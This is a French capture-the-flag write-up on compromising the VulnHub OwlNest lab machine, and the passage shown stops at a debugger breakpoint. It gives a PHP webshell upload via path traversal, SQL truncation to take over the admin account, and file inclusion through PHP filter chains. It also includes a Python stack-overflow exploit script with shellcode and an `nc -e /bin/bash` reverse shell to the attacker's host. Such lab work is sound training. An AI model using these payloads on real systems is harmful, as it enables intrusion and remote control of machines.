# Solution du CTF OwlNest de VulnHub

[OwlNest](https://vulnhub.com/entry/owlnest-102,102/) fait partie de ces vieux CTF de VulnHub (sept. 2014) que j'avais tenté de résoudre à une époque sans succès et sur lequel je reviens avec un esprit revanchard :)

```
Nmap scan report for 192.168.56.77
Host is up (0.00030s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 f41774b48a27c45766d1a2f15325204c (DSA)
|   2048 c0f84ec6f928145bc3ed8a0051aa82d5 (RSA)
|_  256 09949e56f2d47bbfae537345e8fce6ae (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Site doesn't have a title (text/html).
|_Requested resource was /login_form.php
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42781/udp6  status
|   100024  1          54265/udp   status
|   100024  1          55196/tcp   status
|_  100024  1          57929/tcp6  status
31337/tcp open  Elite?
| fingerprint-strings: 
|   GetRequest: 
|     (___/) (___/) (___/) (___/) (___/) (___/)
|     /0\x20/0\x20 /o\x20/o\x20 /0\x20/0\x20 /O\x20/O\x20 /o\x20/o\x20 /0\x20/0\r
|     __V__/ __V__/ __V__/ __V__/ __V__/ __V__/
|     /|:. .:|\x20/|;, ,;|\x20/|:. .:|\x20/|;, ,;|\x20/|;, ,;|\x20/|:. .:|\r
|     \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
|     -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
|     __V__/ __V__/ __V__/ __V__/ __V__/ __V__/
|     This is the OwlNest Administration console
|     Type Help for a list of available commands.
|     Ready: Ready: Ready:
|   NULL: 
|     (___/) (___/) (___/) (___/) (___/) (___/)
|     /0\x20/0\x20 /o\x20/o\x20 /0\x20/0\x20 /O\x20/O\x20 /o\x20/o\x20 /0\x20/0\r
|     __V__/ __V__/ __V__/ __V__/ __V__/ __V__/
|     /|:. .:|\x20/|;, ,;|\x20/|:. .:|\x20/|;, ,;|\x20/|;, ,;|\x20/|:. .:|\r
|     \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
|     -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
|     __V__/ __V__/ __V__/ __V__/ __V__/ __V__/
|     This is the OwlNest Administration console
|     Type Help for a list of available commands.
|_    Ready:
55196/tcp open  status  1 (RPC #100024)
```

## Dans la forêt lointaine

On note des services RPC mais aucun d'intéressant. Il y a aussi un service custom sur le port 31337 mais je ne sais pas quoi en tirer :

```shellsession
$ ncat 192.168.56.77 31337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.77:31337.
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: help

Syntax: command <argument>

help             This help
username         Specify your login name
password         Specify your password
privs    Specify your access level
login            login to shell with specified username and password

Ready: username test
Ready: password test
Ready: privs admin
Ready: login
Access Denied!
Ready: password yolo
Ready: login
Access Denied!
Ready: privs guest
Ready: login
Access Denied!
```

On passe donc sur le port 80 qui nous amène devant une mire de connexion visiblement custom. Le formulaire ne semble pas vulnérable à une injection SQL.

On note aussi la présence d'un formulaire pour créer un compte.

Je lance d'abord une énumération non récursive sur la racine web :

```
301        9l       28w      311c http://192.168.56.77/js
301        9l       28w      317c http://192.168.56.77/includes
301        9l       28w      315c http://192.168.56.77/images
302       26l       80w     1240c http://192.168.56.77/error.php
302       73l      209w     3164c http://192.168.56.77/gallery.php
301        9l       28w      314c http://192.168.56.77/forms
301        9l       28w      317c http://192.168.56.77/graphics
301        9l       28w      315c http://192.168.56.77/errors
301        9l       28w      314c http://192.168.56.77/fonts
301        9l       28w      317c http://192.168.56.77/pictures
301        9l       28w      320c http://192.168.56.77/application
200       15l       51w      576c http://192.168.56.77/register.php
301        9l       28w      312c http://192.168.56.77/css
302       41l      201w     1750c http://192.168.56.77/index.php
200       32l       89w     1182c http://192.168.56.77/login_form.php
302       31l      101w     1227c http://192.168.56.77/login.php
200       61l      170w     2366c http://192.168.56.77/register_form.php
302        0l        0w        0c http://192.168.56.77/uploadform.php
```

Point intéressant : on remarque quelques redirections 302 qui ont pourtant du contenu. Le créateur du site a en effet du placer des appels du type `header("Location: /login.php")` mais n'a pas mis de logique pour stopper l'exécution derrière. C'est un type de vulnérabilité à part entière (qui porte un nom que j'ai oublié lol).

Ca peut permettre de voir des infos intéressantes. Par exemple sur `login.php` on voit ceci :

```html
<br />
<b>Notice</b>:  Undefined index: username in <b>/var/www/login.php</b> on line <b>4</b><br />
<br />
<b>Notice</b>:  Undefined index: username in <b>/var/www/login.php</b> on line <b>9</b><br />
<br />
<b>Notice</b>:  Undefined index: password in <b>/var/www/login.php</b> on line <b>10</b><br />
<html>
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
        <div class="page-header">
                <h1>The OwlNest <small>Logged in as: <br />
<b>Notice</b>:  Undefined variable: loggedinas in <b>/var/www/login.php</b> on line <b>49</b><br />
 (<a href="login_form.php">Logout</a>)</small></h1>
                <ul class="nav nav-pills">
                        <li><a href="/index.php">Home</a></li>
                        <li><a href="/gallery.php">Gallery</a></li>
                        <li><a href="/uploadform.php?page=forms/form.php">Upload</a></li>
                        <li><a href="/login_form.php">Logout</a></li>
                </ul>
        </div>
        <div class="col-sm-6 col-md-9 col-md-offset-3">
                <p>Successfully Logged in.</p>
                <a class="btn btn-lg btn-primary" href="index.php">Continue</a>
        </div>
</body>
</html>
```

On a donc :

- le path de la racine web

- le nom de certaines variables du script

- un paramètre que l'on avait pas encore vu mais qui laisse penser à une faille d'inclusion

Malheureusement `uploadform.php` n'a pas cette vulnérabilité et nécessite d'être authentifié pour avoir une réponse. Je m'enregistre donc et pas plus de chance : je suis redirigé vers `error.php` qui m'indique

> The administrator has configured access restrictions for this page, only the user "admin" is allowed to view it.

Intéressons nous maintenant au path que l'on voyait passé au paramètre `page`. Le dossier `forms` existe bien et le listing est actif. Il y a bien un script `form.php` à l'intérieur et il s'agit... d'un formulaire d'upload.

Il a lui aussi cette erreur comme quoi la variable `loggedinas` n'est pas définie. La raison est certainement parce que le script n'est pas chargé depuis `uploadform.php` qui doit initialiser la variable.

Quoiqu'il en soit, je remplis le formulaire, choisit un shell PHP à uploader et je suis redirigé vers  `/application/upload` qui me répond par le message suivant :

```
File uploaded successfully

Summary Informations:
Your Name: devloop
Your email: devloop@hacker.com
Image Description: devloop
Uploaded Filename: shell.php
```

Je retrouve le fichier à l'adresse  `/images/shell.php` mais il est en erreur :

> **Warning**: Unknown: failed to open stream: Permission denied in **Unknown** on line **0**  
> 
> **Fatal error**: Unknown: Failed opening required '/var/www/images/shell.php' (include_path='.:/usr/share/php:/usr/share/pear') in **Unknown** on line **0**

WTF ! Cette histoire de ligne 0 dans un fichier inconnu me fait plus penser à la directive `auto_prepend_file` de PHP et d'ailleurs quelqu'un la mentionne [dans cette discussion Stack Overflow](https://stackoverflow.com/questions/5326531/php-warning-unknown-failed-to-open-stream). Mais pour la plupart il s'agit uniquement d'un problème de permissions.

Assez étrange que le fichier parvienne jusqu'ici mais qu'on ne puisse pas y accéder. Même si ça n'avait pas trop de sens (si le fichier est inclus par la directive `auto_prepend_file` alors il est inclus dans sa totalité, pas juste une partie) j'ai tout de même d'uploadé un shell qui définissait la variable `loggedinas`. Sans trop de surprise ça n'a pas fonctionné.

J'ai remarqué que le script `/application/upload` est vulnérable à une faille de directory traversal dans le nom du fichier uploadé. Ainsi si je veux que mon fichier se retrouve dans le dossier `application` je modifie la requête pour que le nom de fichier commence par `../application/`. On peut le faire en interceptant la requête avec ZAP proxy ou avec un boût de code Python :

```python
import requests

r = requests.post(
    "http://192.168.56.77/application/upload",
    data={
        "name": "yolo",
        "email": "a@b.com",
        "description": "yolo",
    },
    files={"uploadfield": ("../application/shell.php", "<?php system($_GET['cmd']); ?>")}
)
print(r.text)
```

L'upload fonctionne mais quand j'accède au shell j'obtiens encore l'erreur de permission :( Je ne peux pas non plus uploader par dessus un fichier existant.

## Être admin à la place de l'admin

On l'a vu plus tôt, `uploadform.php` veut un utilisateur *"admin"* comme il le dit lui même entre guillemets. Ca laisse supposer qu'il ne se base pas sur un quelconque droit stocké en base (du genre une colonne `is_admin`) mais bêtement sur le nom d'utilisateur.

Je reviens donc sur le formulaire d'enregistrement qui demande de saisir à la fois le nom mais aussi le nom de login. Je passe *admin* dans ce dernier champ mais j'obtiens

> Username Already Exists

Comment peut on faire pour que le script PHP d'enregistrement accepte un nouveau compte *admin* mais que la vérification croie qu'on est *admin* ? J'ai tenté en jouant sur la casse avec *Admin* mais toujours la même réponse.

C'est alors qu'entre en jeu une particularité méconnue de MySQL qui concerne les VARCHAR (et peut être d'autres types ?) :

Si un champ est déclaré sous la forme `password VARCHAR(40)` alors lors de l'injection en base il sera tronqué à 40 caractères même si ça déborde. Et, point important, s'il est terminé par des espaces, ceux çi sont tronqués aussi.

On serait donc tenté de rajouter des espaces après le mot `admin`. On tente de le faire dans le formulaire mais on est bloqué par le navigateur. En fait la limite est sur le champ HTML :

```html
<input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
```

On retire l'attribut `maxlength` avec les developper tools du browser, on rajoute les espaces et là :

> Username Already Exists

OK il faut être plus malin que ça, on va utiliser le nom `admin                                                  nawak` avec une tripottée d'espaces.

SQL va tronquer à un nombre inconnu de caractères mais sans doute pas loin des 16 spécifiés dans le HTML et donc retier le `nawak`. Puis, comme il y a des espaces en fin de la chaine il va les retirer aussi.

Si de son côté PHP fait un `trim()` sur notre nom d'utilisateur ce dernier restera tel quel (avec le `nawak`) car il n'y a pas cette histoire de tronquage et pour lui il s'agira d'un nouvel utilisateur.

Cette fois me m'enregistre et le script m'indique que tout a fonctioné ! Je peux désormais me connecter avec le compte `admin` (tout court) et le mot de passe que j'ai choisis.

Attention cette technique peut dépendre d'une clause `ORDER BY`  si la requête SQL remonte plusieurs utilisateurs `admin` mais ne prend que le premier résultat... Il peut être intéressant de remplir les autres champs du formulaire avec des valeurs faibles (genre `0` partout) pour remonter premier de la liste.

Il y a plus d'infos sur la vulnérabilité SQL sur ces deux pages :

[Linuxhint: SQL Truncation Attack](https://linuxhint.com/sql-truncation-attack/)

[SQL Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#sql-truncation-attack)

Cette fois j'ai bien accès à `uploadform.php` et mon premier réflexe est de tenter d'inclure mon `shell.php` mais rien à faire, il y a toujours cette histoire de permissions.

Ca n'en reste pas moins une faille d'inclusion classique, je peux donc charger d'autres fichiers présents sur le système. Les fichiers distants ont malheureusement été désactivés par la configuration PHP du CTF.

Je peux voir le fichier `/etc/passwd` :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
rmp:x:1000:1000:rmp,,,:/home/rmp:/bin/bash
mysql:x:104:108:MySQL Server,,,:/nonexistent:/bin/false
```

Désormais pour les failles d'inclusions j'utilise directement la technique de chainage des filtres d'encodage PHP dont j'ai parlé sur [le CTF Corrosion de VulnHub](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Corrosion%20de%20VulnHub.md#kansas-city-shuffle) pour obtenir un RCE sans avoir à injecter quoique ce soit dans un fichier.

J'ai juste besoin de faire un `python php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'` et je passe l'output au paramètre vulnérable du script PHP.

Je suis en présence d'un système 32bits, il va falloir rappatrier un reverse-sshx86 :

`Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686 GNU/Linux`

Il faut juste penser à exécuter reverse-ssh sur un autre port que celui par défaut (31337) car ce dernier est utilisé par le service inconnu.

Une fois connecté on voit qu'en effet nos fichiers uploadés n'appartenaient pas à `www-data` :

`-rw-------  1 rmp      rmp        71 Dec 17 15:27 shell.php`

Cela s'explique par l'utilisation du `suexec` dans la configuration d'Apache :

```apacheconf
        SuexecUserGroup rmp rmp
        <Directory "/var/www/application/">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                <FilesMatch upload$>
                        SetHandler cgi-script
                </FilesMatch>
                Order allow,deny
                Allow from all
        </Directory>
```

## Dans la forêt, là où le hibou allaite ses petits

Dans le dossier de cet utilisateur `rmp` on trouve un exécutable qu'on ne peut pas lire mais on suppose qu'il fait tourner le service inconnu :

`-rwx------ 1 rmp  rmp  599275 Aug 11  2014 adminconsole`

Je dis je suppose car on ne voit rien d'inhabituel dans la liste des processus... étrange. Je vois pourtant mes process et ceux de root mais aussi ceux de *mysql*, *daemon* et *statd*. Configuration du kernel ?

Quoiqu'il en soit on sait qu'il y a un process qui tourne avec le compte `rmp`, c'est ce fameux CGI d'upload :

```shellsession
www-data@owlnest:/etc/apache2$ ls -al /var/www/application/upload
-rwxr-xr-x 1 rmp rmp 615088 Aug 19  2014 /var/www/application/upload
www-data@owlnest:/etc/apache2$ /var/www/application/upload
Content-type: text/plain

 / ___  ___ \
/ / @ \/ @ \ \
\ \___/\___/ /\
 \____\/____/||
 /     /\\\\\//
 |     |\\\\\\
  \      \\\\\\
   \______/\\\\
    _||_||_
     -- --
you gotta be kidding me, right?
```

On obtient le même output que si on l'appelle via le navigateur.

J'ouvre le fichier dans [cutter: Free and Open Source Reverse Engineering Platform powered by rizin](https://github.com/rizinorg/cutter). Le binaire est énorme, il faut dire qu'il est compilé statiquement. Je trouve des noms de fonctions (il n'est pas strippé) dont une recherche web me mène sur [C CGI Library 1.1](https://libccgi.sourceforge.net/doc.html). Le code a donc été écrit à l'aide de cette librairie.

*Cutter* dispose d'un décompilateur qui fait le job. On retrouve par exemple la récupération des différents paramètres :

```c
    ecx = &argv;
    var_1ch = 0;
    s = 0x7261762f;
    eax = *(stdout);
    _IO_fwrite ("Content-type: text/plain\r\n\r\n", 0x7777772f, 0x616d692f, 0x2f736567, 0, *(stdout), 0x1c, 1);
    eax = CGI_get_all ("/tmp/uploaded-XXXXXX");
    var_20h = eax;
    eax = var_20h;
    eax = CGI_lookup_all (eax, "uploadfield");
    var_24h = eax;
    eax = var_20h;
    eax = CGI_lookup_all (eax, "name");
    var_28h = eax;
    eax = var_20h;
    eax = CGI_lookup_all (eax, "email");
    var_2ch = eax;
    eax = var_20h;
    eax = CGI_lookup_all (eax, "description");
    var_30h = eax;
    if (var_24h != 0) {
        eax = var_24h;
        eax = *(eax);
        if (eax != 0) {
            goto label_0;
        }
    }
    eax = *(stdout);
    _IO_fwrite (" / ___  ___ \\r\n/ / @ \/ @ \ \\r\n\ \___/\___/ /\\r\n \____\/____/||\r\n /     /\\\\\//\r\n |     |\\\\\\\r\n  \      \\\\\\\r\n   \______/\\\\\r\n    _||_||_\r\n     -- --\r\n", *(stdout), 0x9d, 1);
    eax = *(stdout);
    _IO_fwrite ("you gotta be kidding me, right?\r\n", *(stdout), 0x21, 1);
    goto label_1;
label_0:
    eax = esp;
    esi = esp;
```

Plus loin, l'email est passé à une fonction custom `validateEmail` que voici :

```c
int32_t validateEmail (const char * s) {
    char * var_110h;
    char * var_10h;
    char * dest;
    const char * src;
    eax = s;
    eax = strlen (eax);
    eax++;
    eax = malloc (eax);
    dest = eax;
    eax = s;
    eax = dest;
    strcpy (eax, s);
    eax = dest;
    eax = strtok (eax, 0x80ae908);
    var_10h = eax;
    eax = strtok (0, 0x80ae908);
    var_10h = eax;
    if (var_10h != 0) {
        eax = var_10h;
        eax = &var_110h;
        strcpy (eax, var_10h);
    }
    eax = 0;
    return eax;
}
```

On pourrait penser à première vue que tout est ok en raison de la présence de la triplette `strlen` / `malloc` / `strcpy` qui s'assure que le buffer destination fait bien la taille diu buffer en entrée.

Mais plus loin il y a un second `strcpy` et celui ci se fait vers une variable locale (`var_110h`) donc sur la stack. Les données copiées viennent d'un `strtok` donc un coupage de chaine de caractère avec l'octét pointé à `0x80ae908`.

La fenêtre hexdump du *Cutter* nous permet de voir que le caractère est `@`. Le programme copie donc toute la partie domaine de l'adresse email.

Il faut déterminer combien de caractères mettre dans cette partie de l'adresse email avant de pouvoir écraser l'adresse de retour. On peut soit utiliser le script de *Metasploit* soit comme ici utiliser *pwntools* :

```python
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(512)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf'
```

J'ai un script Python pour envoyer le bousin :

```python
#!/usr/bin/env python3
from struct import pack
from random import randint
import requests

email = b"a@" + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf"

r = requests.post(
    "http://192.168.56.77/application/upload",
    data={
        "name": "yolo",
        "email": email,
        "description": "yolo",
    },
    files={"uploadfield": (str(randint(1, 1000000)), "a")}
)
```

Et quand dans la VM j'appelle `dmesg`, le kernel me donne la valeur de EIP au moment du crash :

```
[ 8274.339841] upload[3374]: segfault at 63616174 ip 63616174 sp bf9ada30 error 14
```

Je questionne pwntools qui me donne le nombre d'octets à passer avant d'écraser l'adresse de retour :

```python
>>> g.find("\x74\x61\x61\x63")
(276, 0, 276)
```

Il est à noter que bien que l'ASLR soit actif sur le système, le binaire a le bit `NX` désactivé donc je peux placer un shellcode sur la stack et bêtement sauter dessus (les canaries sont désactivés aussi).

J'ai essayé différents payloads et techniques pour obtenir mon shell. La difficulté majeure ici c'est que je faisais l'exploitation à moitié aveugle : bien que je vois la valeur d'EIP via `dmesg` je suis incapable de voir la valeur de autres registres et l'état de la stack. En conséquence je ne sais pas si je dois écraser l'adresse de retour par celle d'un `jmp eax`, `jmp esi` ou `jmp esp` (voire quelque chose de plus compliqué).

De même avec le `jmp esp` que j'ai utilisé je ne savais pas si le registre pointerais sur le début de l'adresse email, la fin, etc.

Finalement je suis arrivé à taton à ce résultat qui place un nopslep puis le shellcode après l'adresse de retour :

```python
#!/usr/bin/env python3
import sys
from struct import pack as struct_pack
from random import randint
import requests

from pwn import *

jmp_esp = struct_pack('<I', 0x080c75ab) # jmp esp, trouvé via ROPgadget
shellcode = asm(pwnlib.shellcraft.i386.linux.sh()).replace(b"/bin", b"/tmp")
email = b"a@" + b"A" * 276 + jmp_esp + b"\x90" * 64 + shellcode

r = requests.post(
    "http://192.168.56.77/application/upload",
    data={
        "name": "yolo",
        "email": email,
        "description": "yolo",
    },
    files={"uploadfield": (str(randint(1, 1000000)), "a")}
)
```

En théorie il est possible de déboguer un script CGI localement en définissant des variables d'environnement qui correspondent à la query string et autres entêtes. Mais avec l'envoi des données en multipart je n'ai pas trouvé d'informations sur le sujet...

Mon shellcode est un classique exec de shell sauf que j'ai remplacé `/bin/sh` par `/tmp/sh` que j'ai préalablement créé :

```bash
#!/bin/bash
nc -e /bin/bash 192.168.56.1 9999 -v
```

J'obtiens mon shell au lancement de l'exploit :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.77.
Ncat: Connection from 192.168.56.77:56083.
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## C'est chouette !

Avec le compte `rmp` on peut finalement accéder au binaire `adminconsole` :

```
adminconsole: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=76f01d048523355a485156a670617b60237a6440, not stripped
```

Un `strings` permet de vérifier qu'il s'agit bien du service attendu :

```
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
This is the OwlNest Administration console
Type Help for a list of available commands.
Syntax: command <argument>
help             This help
username         Specify your login name
password         Specify your password
privs    Specify your access level
login            login to shell with specified username and password
/root/password.txt
Unable to allocate buffer
Ready: 
help
privs 
password 
username 
/root/password.txt
login
Username or Password not set
Access Granted!
Dropping into /bin/sh
/bin/sh
Access Denied!
```

On voit une référence à un fichier `/root/password.txt` qui est intéressante mais le fichier ne nous est bien sûr pas accessible.

Le binaire n'a pas de références à des fonctions réseau et c'est normal puisqu'il est lancé par `xinetd` qui se charge de rediriger les entrées / sorties pour lui (à l'époque c'était assez commun).

On trouve ainsi le fichier de configuration `/etc/xinetd.d/adminconsole` suivant :

```
# default: on

service adminconsole
{
  port = 31337
  type = UNLISTED
  socket_type = stream
  wait = no
  user = root
  server = /home/rmp/adminconsole
  log_on_success += USERID PID HOST EXIT DURATION
  log_on_failure += USERID HOST ATTEMPT
  disable = no
}
```

L'utilisation de `xinetd` explique aussi pourquoi le binaire n'apparaissait pas dans la liste des process : le port était bien en écoute (par `xinetd`) mais le binaire n'est exécuté que quand un client s'y connecte.

Trève de bavardage, j'ai analysé le binaire, toujours avec `Cutter` et à l'aide du code asm et du décompilateur j'ai écrit de simili-code C pour illustrer le code du programme :

```c
int privileges;
char *yourpassword;
char *password;

while true {
    fgets(command, 128, stdin);
    if (!strncmp(command, "privs ", 6)) {
        privileges = strdup(command + 6);
    }

    if (!strncmp(command, "password ", 9) {
        if strlen(command+9) > 30 {
            continue;
        }
        
        if !username  { continue; }
        strncpy(yourpassword, command+9, 31);
        pwd = loadPasswordFromFile(username+32);
        strncpy(password, pwd, 31);
    }
    
    if (!strncmp(command, "username ", 9)) {
        username = malloc(4);
        memset(username, 0, 4);
        strncpy(username + 32, "/root/password.txt", 31);
    }
    
    if (!strncmp(command, "login", 4)) {
        if (yourpassword && password) {
            if (!strncmp(yourpassword, password, 32)) {
                system("/bin/sh");
            } else {
                write(1, "Access denied", 16);
            }
        } else {
            write(1, "username or password not set", 30);
        }
    }
}
```

La fonction `strdup` est tout ce qu'il y a de secure, fait un `strlen`, `malloc` puis `memcpy`. Il y a fort à parier que c'est même celle de la libc.

La fonction `loadPasswordFromFile` m'a fait un peu tilter car elle prend comme input le nom d'utiliateur à partir du 32ème caractère... Bizarre. Pour le reste elle ne fait que charger le fichier donné en argument ou `/root/password.txt` en cas d'échec. Elle lit le mot de passe et le stocke dans la variable `password` qui est comparée à `yourpassword` si on sélectionne le menu `login`.

Il m'a fallut un peu de temps avant de trouver la faille (ça devait être le manque d'alcool) mais d'un côté on a la fonction `strdup` appellée à la demande via la commande `privs` :

```nasm
__strdup (char *s);
; var int32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
; arg char *s @ ebp+0x8
; var const void *s2 @ esp+0x4
; var size_t n @ esp+0x8
0x08056c80      push ebp
0x08056c81      mov ebp, esp
0x08056c83      sub esp, 0x14
0x08056c86      mov dword [var_8h], ebx
0x08056c89      mov ebx, dword [s]
0x08056c8c      mov dword [var_4h], esi
0x08056c8f      mov dword [esp], ebx ; const char *s
0x08056c92      call strlen        ; sym.strlen ; size_t strlen(const char *s)
0x08056c97      lea esi, [eax + 1]
0x08056c9a      mov dword [esp], esi ; size_t size
0x08056c9d      call malloc        ; sym.malloc ; void *malloc(size_t size)
0x08056ca2      mov edx, eax
0x08056ca4      xor eax, eax
0x08056ca6      test edx, edx
0x08056ca8      je 0x8056cba
0x08056caa      mov dword [n], esi ; size_t n
0x08056cae      mov dword [s2], ebx ; const void *s2
0x08056cb2      mov dword [esp], edx ; void *s1
0x08056cb5      call memcpy        ; sym.memcpy ; void *memcpy(void *s1, const void *s2, size_t n)
0x08056cba      mov ebx, dword [var_8h]
0x08056cbd      mov esi, dword [var_4h]
0x08056cc0      mov esp, ebp
0x08056cc2      pop ebp
0x08056cc3      ret
```

Et de l'autre la saisie du `username` qui fait un `malloc` aussi mais stocke le nom de fichier `/root/password.txt` à l'adresse du buffer alloué + 32 caractères :

```nasm
0x080486fa      mov dword [stream], 9 ; size_t n
0x08048702      mov dword [size], str.username ; 0x80abc08 ; const char *s2
0x0804870a      lea eax, [s1]
0x0804870e      mov dword [esp], eax ; const char *s1
0x08048711      call strncmp       ; sym.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x08048716      test eax, eax
0x08048718      jne 0x8048768
0x0804871a      mov dword [esp], 4 ; size_t size
0x08048721      call malloc        ; sym.malloc ; void *malloc(size_t size)
0x08048726      mov dword [auth], eax ; 0x80cc2c0
0x0804872b      mov eax, dword [auth] ; 0x80cc2c0
0x08048730      mov dword [stream], 4 ; size_t n
0x08048738      mov dword [size], 0 ; int c
0x08048740      mov dword [esp], eax ; void *s
0x08048743      call memset        ; sym.memset ; void *memset(void *s, int c, size_t n)
0x08048748      mov eax, dword [auth] ; 0x80cc2c0
0x0804874d      add eax, 0x20      ; sym.__libc_tsd_CTYPE_TOLOWER
0x08048750      mov dword [stream], 0x1f ; 31 ; size_t  n
0x08048758      mov dword [size], str.root_password.txt ; 0x80abc12 ; const char *src
0x08048760      mov dword [esp], eax ; char *dest
0x08048763      call strncpy       ; sym.strncpy ; char *strncpy(char *dest, const char *src, size_t  n)
0x08048768      mov dword [stream], 4 ; size_t n
```

L'idée est de voir si on peut commencer par provoquer le `malloc` `username` (qui contient le path du fichier) puis écraser le path par le `malloc` du `privs`.

Dans la session GDP suivante je place deux breakpoints :

- un après le `memcpy` du `strdup`

- un après le `strcpy` du `/root/password.txt`

```shellsession
$ gdb -q ./adminconsole 
Reading symbols from ./adminconsole...

This GDB supports auto-downloading debuginfo from the following URLs:
https://debuginfod.opensuse.org/ 
Enable debuginfod for this session? (y or [n]) n
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./adminconsole)
(gdb) b *0x08056cba
Breakpoint 1 at 0x8056cba
